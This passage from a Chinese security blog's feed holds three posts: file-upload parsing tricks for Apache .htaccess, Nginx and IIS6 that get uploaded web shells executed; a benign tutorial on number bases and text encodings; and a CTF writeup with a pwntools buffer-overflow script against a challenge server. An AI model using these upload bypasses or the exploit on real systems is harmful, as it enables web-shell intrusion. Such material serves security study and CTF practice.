title="妙用.HTACCESS"></a>妙用.HTACCESS</h4><p>Apache提供了一种很方便的、可作用于当前目录及其子目录的分布式配置文件：.htaccess</p><p>要使.htaccess文件生效，需要在Apache的配置文件中写上(这里我的配置文件中默认就有以下配置)：</p><pre><code>AllowOverride AllLoadModule rewrite_module modules/mod_rewrite.so</code></pre><p>之后，我们测试用.htaccess文件修改php解释器配置：</p><p>新建一个.htaccess文件，由于windows不支持文件名以小数点开头，需要用到cmd命令：</p><pre><code>echo &gt; .htaccess</code></pre><p>这样即可生成.htaccess文件；在这个文件里面写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx&quot;&gt;  </span><br><span class="line">    SetHandler application&#x2F;x-httpd-php  </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>即让php解释器将文件名中含有xxx的文件解析为php</p><p>在此.htaccess目录创建a.xxx文件，在里面写入：</p><pre><code>&lt;?phpecho &#39;good&#39;;?&gt;</code></pre><p>发现其被解析成了php：</p><h3 id="Ngnix"><a href="#Ngnix" class="headerlink" title="Ngnix"></a>Ngnix</h3><ol><li><p>Nginx版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Nginx 0.5.*</span><br><span class="line">Nginx 0.6.*</span><br><span class="line">Nginx 0.7 &lt;&#x3D; 0.7.65</span><br><span class="line">Nginx 0.8 &lt;&#x3D; 0.8.37</span><br></pre></td></tr></table></figure><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求</p></li><li><p>Nginx版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nginx 0.8.41 – 1.5.6：</span><br></pre></td></tr></table></figure><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p></li></ol><h3 id="IIS6-0"><a href="#IIS6-0" class="headerlink" title="IIS6.0"></a>IIS6.0</h3><p>IIS6.0属于winserver下的服务器</p><p>asp即 active server pages，是microsoft公司开发的服务端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序</p><ol><li><p>目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析</p></li><li><p>文件名中如果包含.asp;、.asa;、.cer;则优先使用asp解析，如asa.asa;asa.jpg</p></li></ol><p>参考：</p><p><a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/">https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进制与编码</title>
      <link href="2019/08/16/binary-coding/"/>
      <url>2019/08/16/binary-coding/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了CTF中一些常见的进制和编码方式！</p><a id="more"></a><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><p>二进制数据是用0和1两个数码来表示的数，当前的计算机系统使用的基本上是二进制系统。</p><p>二进制（简称Bin)为什么用八位来表示？</p><p>八位（8bit）是一个字节，计算机中只要一个字节就可以存放ASCII编码，就是所有的数字、大小写字母和一些特殊字符（总共255个）。所以在计算机中对用户来说有意义的单位就是字节，这是我们可以看懂的。八位的二进制数最大值就是255，刚好表示255个ASCII字符</p><h2 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h2><p>八进制，Octal，缩写OCT或O，一种以8为基数的计数法，采用0，1，2，3，4，5，6，7八个数字，逢八进1。一些编程语言中常常以数字0开始表明该数字是八进制。八进制的数和二进制数可以按位对应（八进制一位对应二进制三位），因此常应用在计算机语言中。</p><h2 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h2><p>十六进制（简写为hex或下标16）在数学中是一种逢16进1的进位制。一般用数字0到9和字母A到F（或af）表示，其中:AF表示10~15，这些称作十六进制数字。</p><p>一般以0x开头的都是十六进制形式，且是两位来表示，16x16=2^8,刚好和二进制对应</p><h2 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h2><p>ASCII ((American Standard Code for Information Interchange): 美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是最通用的信息交换标准，并等同于国际标准ISO/IEC 646。</p><p><img src="/2019/08/16/binary-coding/12256356.png"></p><p>第0～32号及第127号(共34个)是控制字符或通讯专用字符，如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BEL（振铃）等；<br>通讯专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等；</p><p>第33～126号(共94个)是字符，其中第48～57号为0～9十个阿拉伯数字；65～90号为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。</p><p>示例<br>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>ASCII编码对应十进制：</p><pre><code>84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103</code></pre><h1 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h1><h3 id="历史问题"><a href="#历史问题" class="headerlink" title="历史问题"></a>历史问题</h3><p>英语用 128 个字符来编码完全是足够的，但是用来表示其他语言，128 个字符是远远不够的。于是，一些欧洲的国家就决定，将 ASCII 码中闲置的最高位利用起来，这样一来就能表示 256 个字符。但是，这里又有了一个问题，那就是不同的国家的字符集可能不同，就算它们都能用 256 个字符表示全，但是同一个码点（也就是 8 位二进制数）表示的字符可能可能不同。例如，144 在阿拉伯人的 ASCII 码中是 گ，而在俄罗斯的 ASCII 码中是 ђ。</p><p>因此，ASCII 码的问题在于尽管所有人都在 0 - 127 号字符上达成了一致，但对于 128 - 255 号字符上却有很多种不同的解释。与此同时，亚洲语言有更多的字符需要被存储，一个字节已经不够用了。于是，人们开始使用两个字节来存储字符。</p><p>各种各样的编码方式成了系统开发者的噩梦，因为他们想把软件卖到国外。于是，他们提出了一个“内码表”的概念，可以切换到相应语言的一个内码表，这样才能显示相应语言的字母。在这种情况下，如果使用多语种，那么就需要频繁的在内码表内进行切换。</p><h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p>最终，美国人意识到他们应该提出一种标准方案来展示世界上所有语言中的所有字符，出于这个目的，Unicode诞生了。</p><p>Unicode 当然是一本很厚的字典，记录着世界上所有字符对应的一个数字。具体是怎样的对应关系，又或者说是如何进行划分的，就不是我们考虑的问题了，我们只用知道 Unicode 给所有的字符指定了一个数字用来表示该字符。</p><p>对于 Unicode 有一些误解，它仅仅只是一个字符集，规定了符合对应的二进制代码，至于这个二进制代码如何存储则没有任何规定。它的想法很简单，就是为每个字符规定一个用来表示该字符的数字，仅此而已。</p><h3 id="Unicode-编码方案"><a href="#Unicode-编码方案" class="headerlink" title="Unicode 编码方案"></a>Unicode 编码方案</h3><p>之前提到，Unicode 没有规定字符对应的二进制码如何存储。以汉字“汉”为例，它的 Unicode 码点是 0x6c49，对应的二进制数是 110110001001001，二进制数有 15 位，这也就说明了它至少需要 2 个字节来表示。可以想象，在 Unicode 字典中往后的字符可能就需要 3 个字节或者 4 个字节，甚至更多字节来表示了。</p><p>这就导致了一些问题，计算机怎么知道你这个 2 个字节表示的是一个字符，而不是分别表示两个字符呢？这里我们可能会想到，那就取个最大的，假如 Unicode 中最大的字符用 4 字节就可以表示了，那么我们就将所有的字符都用 4 个字节来表示，不够的就往前面补 0。这样确实可以解决编码问题，但是却造成了空间的极大浪费，如果是一个英文文档，那文件大小就大出了 3 倍，这显然是无法接受的。</p><p>于是，为了较好的解决 Unicode 的编码问题， UTF-8 和 UTF-16 两种当前比较流行的编码方式诞生了。当然还有一个 UTF-32 的编码方式，也就是上述那种定长编码，字符统一使用 4 个字节，虽然看似方便，但是却不如另外两种编码方式使用广泛。</p><h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>UTF-8 是一个非常惊艳的编码方式，漂亮的实现了对 ASCII 码的向后兼容，以保证 Unicode 可以被大众接受。</p><p>UTF-8 是目前互联网上使用最广泛的一种 Unicode 编码方式，它的最大特点就是可变长。它可以使用 1 - 4 个字节表示一个字符，根据字符的不同变换长度。编码规则如下：</p><p>对于单个字节的字符，第一位设为 0，后面的 7 位对应这个字符的 Unicode 码点。因此，对于英文中的 0 - 127 号字符，与 ASCII 码完全相同。这意味着 ASCII 码那个年代的文档用 UTF-8 编码打开完全没有问题。</p><p>对于需要使用 N 个字节来表示的字符（N &gt; 1），第一个字节的前 N 位都设为 1，第 N + 1 位设为0，剩余的 N - 1 个字节的前两位都设位 10，剩下的二进制位则使用这个字符的 Unicode 码点来填充。</p><p>编码规则如下：</p><pre><code>Unicode 十六进制码点范围    UTF-8 二进制0000 0000 - 0000 007F    0xxxxxxx0000 0080 - 0000 07FF    110xxxxx 10xxxxxx0000 0800 - 0000 FFFF    1110xxxx 10xxxxxx 10xxxxxx0001 0000 - 0010 FFFF    11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</code></pre><p>根据上面编码规则对照表，进行 UTF-8 编码和解码就简单多了。下面以汉字“汉”为利，具体说明如何进行 UTF-8 编码和解码。</p><p>“汉”的 Unicode 码点是 0x6c49（110 1100 0100 1001），通过上面的对照表可以发现，0x0000 6c49 位于第三行的范围，那么得出其格式为 1110xxxx 10xxxxxx 10xxxxxx。接着，从“汉”的二进制数最后一位开始，从后向前依次填充对应格式中的 x，多出的 x 用 0 补上。这样，就得到了“汉”的 UTF-8 编码为 11100110 10110001 10001001，转换成十六进制就是 0xE6 0xB7 0x89。</p><p>解码的过程也十分简单：如果一个字节的第一位是 0 ，则说明这个字节对应一个字符；如果一个字节的第一位1，那么连续有多少个 1，就表示该字符占用多少个字节。</p><h2 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h2><p>在了解 UTF-16 编码方式之前，先了解一下另外一个概念——“平面”。</p><p>在上面的介绍中，提到了 Unicode 是一本很厚的字典，她将全世界所有的字符定义在一个集合里。这么多的字符不是一次性定义的，而是分区定义。每个区可以存放 65536 个（2^16）字符，称为一个平面（plane）。目前，一共有 17 个（2^5）平面，也就是说，整个 Unicode 字符集的大小现在是 2^21。</p><p>最前面的 65536 个字符位，称为基本平面（简称 BMP ），它的码点范围是从 0 到 2^16-1，写成 16 进制就是从 U+0000 到 U+FFFF。所有最常见的字符都放在这个平面，这是 Unicode 最先定义和公布的一个平面。剩下的字符都放在辅助平面（简称 SMP ），码点范围从 U+010000 到 U+10FFFF。</p><p>基本了解了平面的概念后，再说回到 UTF-16。UTF-16 编码介于 UTF-32 与 UTF-8 之间，同时结合了定长和变长两种编码方法的特点。它的编码规则很简单：基本平面的字符占用 2 个字节，辅助平面的字符占用 4 个字节。也就是说，UTF-16 的编码长度要么是 2 个字节（U+0000 到 U+FFFF），要么是 4 个字节（U+010000 到 U+10FFFF）。那么问题来了，当我们遇到两个字节时，到底是把这两个字节当作一个字符还是与后面的两个字节一起当作一个字符呢？</p><p>这里有一个很巧妙的地方，在基本平面内，从 U+D800 到 U+DFFF 是一个空段，即这些码点不对应任何字符。因此，这个空段可以用来映射辅助平面的字符。</p><p>辅助平面的字符位共有 2^20 个，因此表示这些字符至少需要 20 个二进制位。UTF-16 将这 20 个二进制位分成两半，前 10 位映射在 U+D800 到 U+DBFF，称为高位（H），后 10 位映射在 U+DC00 到 U+DFFF，称为低位（L）。这意味着，一个辅助平面的字符，被拆成两个基本平面的字符表示。</p><p>因此，当我们遇到两个字节，发现它的码点在 U+D800 到 U+DBFF 之间，就可以断定，紧跟在后面的两个字节的码点，应该在 U+DC00 到 U+DFFF 之间，这四个字节必须放在一起解读。</p><p>接下来，以汉字”𠮷”为例，说明 UTF-16 编码方式是如何工作的。</p><p>汉字”𠮷”的 Unicode 码点为 0x20BB7，该码点显然超出了基本平面的范围（0x0000 - 0xFFFF），因此需要使用四个字节表示。首先用 0x20BB7 - 0x10000 计算出超出的部分，然后将其用 20 个二进制位表示（不足前面补 0 ），结果为0001000010 1110110111。接着，将前 10 位映射到 U+D800 到 U+DBFF 之间，后 10 位映射到 U+DC00 到 U+DFFF 即可。U+D800 对应的二进制数为 1101100000000000，直接填充后面的 10 个二进制位即可，得到 1101100001000010，转成 16 进制数则为 0xD842。同理可得，低位为 0xDFB7。因此得出汉字”𠮷”的 UTF-16 编码为 0xD842 0xDFB7。</p><p>Unicode3.0 中给出了辅助平面字符的转换公式：</p><pre><code>H = Math.floor((c-0x10000) / 0x400)+0xD800L = (c - 0x10000) % 0x400 + 0xDC00</code></pre><p>根据编码公式，可以很方便的计算出字符的 UTF-16 编码。</p><p><strong>示例</strong></p><p>Unicode编码有以下四种编码方式：</p><p>源文本：<code>The</code></p><pre><code>&amp;#x [Hex]：&amp;amp;#x0054;&amp;amp;#x0068;&amp;amp;#x0065;&amp;# [Decimal]：&amp;amp;#00084;&amp;amp;#00104;&amp;amp;#00101;\U [Hex]：\U0054\U0068\U0065\U+ [Hex]：\U+0054\U+0068\U+0065</code></pre><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>url编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值 ，将它们以name/value参数编码（移去那些不能传送的字符，将数据排行等等）作为URL的一部分或者分离地发给服务器。</p><h3 id="为什么要URL编码？"><a href="#为什么要URL编码？" class="headerlink" title="为什么要URL编码？"></a>为什么要URL编码？</h3><p>在因特网上传送URL，只能采用ASCII字符集</p><p>也就是说URL只能使用英文字母、阿拉伯数字和某些标点符号，不能使用其他文字和符号，即只有字母和数字<code>[0-9a-zA-Z]</code>、一些特殊符号<code>$-_.+!*&#39;()</code>(不包括双引号)、以及某些保留字（空格转换为+），才可以不经过编码直接用于URL这意味着 如果URL中有汉字，就必须编码后使用。</p><h3 id="如何编码"><a href="#如何编码" class="headerlink" title="如何编码"></a>如何编码</h3><p>URL编码通常也被称为百分号编码（percent-encoding），是因为它的编码方式非常简单：</p><p>使用%加上两位的字符——0123456789ABCDEF——代表一个字节的十六进制形式。URL编码要做的，就是将每一个非安全的ASCII字符都被替换为“%xx”格式，<br>对于非ASCII字符，RFC文档建议使用utf-8对其进行编码得到相应的字节，然后对每个字节执行百分号编码。<br>如”中文”使用UTF-8字符集得到的字节为<code>0xE4 0xB8 0xAD 0xE6 0x96 0x87</code>，经过Url编码之后得到<code>%E4%B8%AD%E6%96%87</code>。</p><p><strong>示例</strong></p><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：</p><pre><code>%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67</code></pre><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>在 HTML 中，某些字符是预留的。</p><p>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</p><p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</p><p>字符实体类似这样：</p><pre><code>&amp;entity_name;</code></pre><p>或者</p><pre><code>&amp;#entity_number;</code></pre><p>如需显示小于号，我们必须这样写：<code>&amp;lt;</code> 或<code>&amp;#60</code>;</p><p><strong>参考：</strong></p><p><a href="https://www.cnblogs.com/crazylqy/p/10184291.html">https://www.cnblogs.com/crazylqy/p/10184291.html</a></p><p><a href="https://www.cnblogs.com/xzwblog/p/6932870.html">https://www.cnblogs.com/xzwblog/p/6932870.html</a></p><p><a href="https://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86.html">https://uknowsec.cn/posts/ctf/CTF中那些脑洞大开的编码和加密.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 进制 </tag>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中原工学院Drops夏令营新生赛writeup</title>
      <link href="2019/08/15/drops-new-2019/"/>
      <url>2019/08/15/drops-new-2019/</url>
      
        <content type="html"><![CDATA[<p>本篇博客记录了本人参加drops攻防训练营最后的新生赛的一些writeup,很菜，勿喷！！！</p><a id="more"></a><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>和攻防世界level0相似，改下之前前脚本就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;101.132.41.135&quot;,&quot;10000&quot;)</span><br><span class="line">v &#x3D; 0x80485E6</span><br><span class="line">payload &#x3D; 112*&#39;a&#39; + p32(v)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>v是后门函数的地址</p><p>112*’a’代表0x6c大小的buf加上32位4个字节的ebp</p><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="chaos-file"><a href="#chaos-file" class="headerlink" title="chaos file"></a>chaos file</h3><p>打开网址看到是这样的：</p><p><img src="/2019/08/15/drops-new-2019/20190810181622.png"></p><p>把php代码整理一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> $_ &#x3D; &lt;&lt;&lt;asdfiohaefho</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doV1YwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldoVVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldoVFYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span 